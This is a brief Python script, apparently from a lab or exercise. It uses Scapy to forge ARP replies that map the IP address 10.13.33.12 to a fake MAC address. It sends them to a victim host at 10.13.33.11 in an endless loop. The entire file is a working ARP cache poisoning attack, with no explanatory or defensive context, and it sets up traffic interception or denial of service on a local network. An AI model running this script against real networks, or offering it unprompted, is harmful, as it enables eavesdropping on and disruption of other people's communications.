from scapy.all import ARP, sendp, Ether, send


VictimeIP = "10.13.33.11"
#VictimeMac = "08:00:27:c3:f7:29"
PoisonnedIP = "10.13.33.12"
PoisonnedMac = "de:ad:be:ef:ca:fe"
arp_response = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=PoisonnedIP, hwsrc=PoisonnedMac, pdst=VictimeIP)


while True:
    send(arp_response, verbose=1)